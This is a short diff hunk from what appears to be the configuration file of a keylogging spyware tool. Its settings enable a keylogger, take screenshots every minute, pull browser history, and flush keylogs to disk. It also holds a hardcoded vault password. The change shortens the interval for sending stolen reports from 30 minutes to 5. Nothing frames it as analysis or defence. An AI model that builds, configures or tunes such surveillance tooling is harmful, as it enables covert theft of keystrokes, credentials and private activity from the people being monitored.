@@ -14,7 +14,7 @@ VAULT_PASSWORD = "decdrv"
 SCREENSHOT_INTERVAL_SECONDS    = 60    # screenshot every 60 seconds
 LOG_FLUSH_INTERVAL_SECONDS     = 300   # flush keylogs to disk every 5 minutes
 BROWSER_CHECK_INTERVAL_SECONDS = 600   # pull browser history every 10 minutes
-DELIVERY_INTERVAL_SECONDS      = 1800  # send report every 30 minutes
+DELIVERY_INTERVAL_SECONDS      = 300   # send report every 5 minutes
 
 # ── MODULES TOGGLE ───────────────────────────────────────────────────────────
 ENABLE_KEYLOGGER       = True
